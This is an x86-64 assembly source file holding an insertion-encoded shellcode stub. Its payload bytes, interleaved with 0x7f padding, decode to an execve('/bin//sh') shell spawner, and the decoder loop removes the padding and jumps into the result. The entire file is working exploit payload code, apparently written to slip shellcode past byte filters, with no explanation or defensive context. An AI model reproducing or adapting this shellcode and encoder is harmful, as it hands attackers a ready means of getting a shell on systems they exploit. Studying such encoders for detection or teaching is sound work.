section .text

global _start

_start:
	jmp short starting
	shellcode : db 0x48,0x7f,0x31,0x7f,0xc0,0x7f,0x50,0x7f,0x48,0x7f,0xbe,0x7f,0x2f,0x7f,0x2f,0x7f,0x62,0x7f,0x69,0x7f,0x6e,0x7f,0x2f,0x7f,0x73,0x7f,0x68,0x7f,0x56,0x7f,0x48,0x7f,0x89,0x7f,0xe7,0x7f,0x48,0x7f,0x31,0x7f,0xf6,0x7f,0x48,0x7f,0x31,0x7f,0xd2,0x7f,0xb0,0x7f,0x3b,0x7f,0x0f,0x7f,0x05,0x7f,0x7e,0x7e,

starting:
	lea rsi,[rel shellcode]
	lea rdi,[rsi+1]
	xor rax,rax
	mov al,1
	xor rbx,rbx
	
decode:
	mov bl,byte[rsi+rax]
	xor bl,0x7f
	jnz short shellcode

	mov bl,byte[rsi+rax+1]
	mov byte[rdi],bl

	inc rdi
	add rax,2

	jmp short decode
		 
